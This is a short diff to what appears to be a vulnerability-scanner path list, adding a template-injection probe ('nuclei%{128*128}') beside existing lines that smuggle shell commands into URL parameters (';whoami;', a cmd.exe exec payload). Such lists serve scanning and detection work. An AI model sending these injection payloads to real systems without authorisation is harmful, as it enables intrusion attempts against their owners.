@@ -88,3 +88,4 @@
 /upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;whoami;%27
 /scrm/crm/admin
 /?search==%00{.exec|cmd.exe+/c+ping+127.0.0.1+-n+10.}
+/?id=nuclei%25{128*128}
